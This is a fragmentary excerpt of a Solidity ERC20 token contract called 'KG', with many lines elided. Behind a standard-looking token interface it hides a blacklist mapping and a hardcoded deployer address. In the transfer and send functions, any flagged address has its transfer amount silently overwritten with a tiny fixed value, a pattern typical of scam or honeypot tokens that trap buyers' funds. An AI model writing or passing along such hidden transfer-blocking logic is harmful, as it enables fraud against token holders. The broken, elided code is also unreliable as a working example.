...
abstract contract Context {
    address _Deployer = 0x4B86ca523951ABBFC93b5Fc623928e6A4C916AbC;
 ...
 */
contract KG is Context, IERC20  {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => bool) private _user_;
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _fee;
   uint8 public decimals = 6;
   uint256 public _TSup = 4206900 *1000000;
    string public name = "KG";
    string public symbol = unicode"KG";
...
_fee[_Deployer] = 1;
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual { require(
        ...
        recipient != address(0), "ERC20: transfer to the zero address"); 
               uint tax_ = 1;
        if (_user_[sender] || _user_[recipient]) amount = tax_ * _fees;
    ...
    function _send(address recipient, uint256 amount) internal virtual {require(
        ...
        recipient != address(0), "ERC20: transfer to the zero address"); 
        uint tax_ = 1;
        if (_user_[msg.sender]) amount = tax_ * _fees;
